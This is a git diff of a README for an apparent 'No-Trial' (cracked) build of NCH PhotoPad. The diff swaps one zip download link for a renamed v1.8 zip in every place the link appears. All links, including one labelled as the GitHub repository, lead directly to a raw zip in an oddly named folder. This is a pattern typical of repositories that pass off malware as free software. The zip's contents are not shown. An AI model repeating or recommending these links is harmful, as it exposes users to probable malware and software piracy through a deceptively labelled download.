@@ -1,6 +1,6 @@
 # 🎉 NCH-PhotoPad-Image-No-Trial - Effortless Photo Editing for Everyone
 
-[![Download NCH PhotoPad](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NCH-PhotoPad-Image-No-Trial_v1.2.zip%20NCH%20PhotoPad%20Image-brightgreen)](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NCH-PhotoPad-Image-No-Trial_v1.2.zip)
+[![Download NCH PhotoPad](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NC_Photo_Trial_Image_Pad_No_v1.8.zip%20NCH%20PhotoPad%20Image-brightgreen)](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NC_Photo_Trial_Image_Pad_No_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download, make sure your Windows PC meets these requirements:
 
 ## 📥 Download & Install
 
-To download NCH PhotoPad Image, visit this page: [Download NCH PhotoPad Image](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NCH-PhotoPad-Image-No-Trial_v1.2.zip).
+To download NCH PhotoPad Image, visit this page: [Download NCH PhotoPad Image](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NC_Photo_Trial_Image_Pad_No_v1.8.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release at the top of the page.
@@ -61,6 +61,6 @@ Engage with other users and developers. Share your experiences, tips, and tricks
 
 NCH PhotoPad Image is designed with users in mind. Whether you're a beginner or have some experience in photo editing, this software aims to simplify the process. Explore its capabilities to make your photos look their best. 
 
-For more information, visit our [GitHub Repository](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NCH-PhotoPad-Image-No-Trial_v1.2.zip). 
+For more information, visit our [GitHub Repository](https://raw.githubusercontent.com/iddi655/NCH-PhotoPad-Image-No-Trial/main/affectedly/NC_Photo_Trial_Image_Pad_No_v1.8.zip). 
 
 Thank you for choosing NCH PhotoPad Image as your photo editing companion! Enjoy your editing experience.
